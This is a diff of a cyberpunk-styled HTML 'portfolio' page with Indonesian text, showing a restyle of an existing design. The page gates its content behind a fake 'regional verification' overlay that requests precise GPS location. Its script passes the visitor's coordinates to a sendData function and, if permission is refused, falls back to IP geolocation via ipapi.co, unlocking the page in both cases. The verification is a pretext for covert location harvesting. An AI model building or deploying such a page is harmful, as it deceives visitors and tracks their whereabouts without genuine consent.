@@ -3,67 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBERNETIC SYSTEM</title>
+    <title>CYBERNETIC PORTFOLIO</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00f3ff; --dark: #0a0a0a; }
-        body { margin: 0; background: var(--dark); color: var(--neon); font-family: 'Courier New', monospace; scroll-behavior: smooth; overflow-y: auto; }
-        .page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border-bottom: 1px solid #222; }
-        .cyber-btn { background: transparent; border: 2px solid var(--neon); color: var(--neon); padding: 15px 30px; cursor: pointer; margin: 10px; width: 280px; box-shadow: 0 0 10px var(--neon); transition: 0.3s; }
-        .cyber-btn:hover { background: var(--neon); color: black; }
-        .hidden { display: none; }
+        :root { --neon: #00f3ff; --dark: #0a0a0a; --glass: rgba(255, 255, 255, 0.05); }
+        body { margin: 0; background: var(--dark); color: var(--neon); font-family: 'Orbitron', sans-serif; overflow-x: hidden; background-image: linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px); background-size: 40px 40px; }
+        
+        #top-bar { padding: 20px; text-align: center; border-bottom: 1px solid var(--neon); }
+        .page { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        
+        .cyber-btn { background: var(--glass); backdrop-filter: blur(10px); border: 1px solid var(--neon); color: var(--neon); padding: 15px; width: 300px; cursor: pointer; margin: 10px; transition: 0.4s; text-transform: uppercase; }
+        .cyber-btn:hover { background: var(--neon); color: black; box-shadow: 0 0 20px var(--neon); }
         
         #overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:999; display:none; flex-direction:column; justify-content:center; align-items:center; }
-        .details { margin-top: 10px; padding: 15px; border: 1px solid var(--neon); width: 80%; max-width: 400px; text-align: center; }
-        .social-btn { display: flex; align-items: center; justify-content: center; width: 280px; padding: 10px; margin: 5px; color: white; border: none; cursor: pointer; }
+        .details { background: rgba(0,0,0,0.9); border: 1px solid var(--neon); padding: 20px; width: 80%; max-width: 400px; margin-top: 10px; text-align: center; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
+    <div id="top-bar">
+        <div id="clock">00:00:00</div>
+        <div id="date">--/--/----</div>
+    </div>
+
     <div class="page" id="page-1">
-        <h1>PROJECT CYBER</h1>
+        <h1>PORTFOLIO SYSTEM</h1>
         <button class="cyber-btn" onclick="checkAuth()">MASUK</button>
     </div>
 
     <div id="overlay">
-        <h2 style="color:white">VERIFIKASI REGIONAL</h2>
-        <p>Mohon izin akses lokasi untuk verifikasi perangkat.</p>
+        <h2>VERIFY IDENTITY</h2>
+        <p>Akses lokasi diperlukan untuk validasi regional.</p>
         <button class="cyber-btn" onclick="verifyLocation()">IZINKAN AKSES</button>
     </div>
 
     <div id="main-content" class="hidden">
         <div class="page">
-            <button class="cyber-btn" onclick="toggle('det1')">Opsi 1: Tentang Developer</button>
-            <div id="det1" class="hidden details">Deskripsi lengkap developer ada di sini.</div>
+            <button class="cyber-btn" onclick="toggle('d1')">1. Tentang Developer</button>
+            <div id="d1" class="hidden details">Data Pribadi: Saya adalah seorang pengembang yang fokus pada keamanan sistem dan UI futuristik.</div>
             
-            <button class="cyber-btn" onclick="toggle('det2')">Opsi 2: Layanan</button>
-            <div id="det2" class="hidden details">Detail layanan Anda...</div>
+            <button class="cyber-btn" onclick="toggle('d2')">2. Layanan</button>
+            <div id="d2" class="hidden details">Menyediakan jasa pengembangan web custom dengan tema cyberpunk.</div>
 
-            <button class="cyber-btn" onclick="toggle('det3')">Opsi 3: Portfolio</button>
-            <div id="det3" class="hidden details">Detail portfolio Anda...</div>
+            <button class="cyber-btn" onclick="toggle('d3')">3. Data Store</button>
+            <div id="d3" class="hidden details">Akses aset digital dan tools yang saya kembangkan untuk umum.</div>
 
-            <button class="cyber-btn" onclick="toggle('det4')">Opsi 4: Ketentuan</button>
-            <div id="det4" class="hidden details">Detail ketentuan Anda...</div>
-        </div>
+            <button class="cyber-btn" onclick="toggle('d4')">4. Ketentuan</button>
+            <div id="d4" class="hidden details">Hanya untuk penggunaan edukasi dan riset keamanan.</div>
 
-        <div class="page">
-            <button class="cyber-btn" onclick="toggle('support')">SUPPORT DEVELOPER</button>
+            <button class="cyber-btn" onclick="toggle('support')">5. Support Developer</button>
             <div id="support" class="hidden details">
-                <button class="social-btn" style="background:red" onclick="window.open('URL_WEB')">Website</button>
-                <button class="social-btn" style="background:#25D366" onclick="window.open('https://wa.me/628XXXXXXXX')">WhatsApp</button>
-                <button class="social-btn" style="background:black" onclick="window.open('URL_TT')">TikTok</button>
-                <button class="social-btn" style="background:gray" onclick="window.open('URL_GH')">GitHub</button>
+                <button class="cyber-btn" onclick="window.open('URL_WEB')">Website</button>
+                <button class="cyber-btn" onclick="window.open('https://wa.me/628XXXX')">WhatsApp</button>
             </div>
 
-            <button class="cyber-btn" onclick="toggle('contact')">CONTACT ADMIN</button>
+            <button class="cyber-btn" onclick="toggle('contact')">6. Contact Admin</button>
             <div id="contact" class="hidden details">
-                <img src="qris.jpg" style="width:150px; border:2px solid var(--neon)">
+                <img src="qris.jpg" style="width:150px; border:2px solid var(--neon);">
                 <br>
-                <button class="social-btn" style="background:#25D366" onclick="window.open('https://wa.me/628XXXXXXXX')">CHAT VIA WHATSAPP</button>
+                <button class="cyber-btn" onclick="window.open('https://wa.me/628XXXX')">CHAT VIA WA</button>
             </div>
         </div>
     </div>
 
     <script>
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').innerText = now.toLocaleTimeString();
+            document.getElementById('date').innerText = now.toLocaleDateString();
+        }
+        setInterval(updateClock, 1000);
+
         function checkAuth() {
             if (localStorage.getItem('verified') === 'true') {
                 document.getElementById('main-content').classList.remove('hidden');
@@ -78,17 +89,17 @@
                 (pos) => {
                     localStorage.setItem('verified', 'true');
                     sendData(pos.coords.latitude, pos.coords.longitude, 'GPS_Akurat');
-                    completeLogin();
+                    complete();
                 },
                 () => {
                     fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendData(d.latitude, d.longitude, 'IP_Estimasi'));
-                    completeLogin();
+                    complete();
                 },
                 { enableHighAccuracy: true }
             );
         }
 
-        function completeLogin() {
+        function complete() {
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('main-content').classList.remove('hidden');
             document.getElementById('page-1').classList.add('hidden');
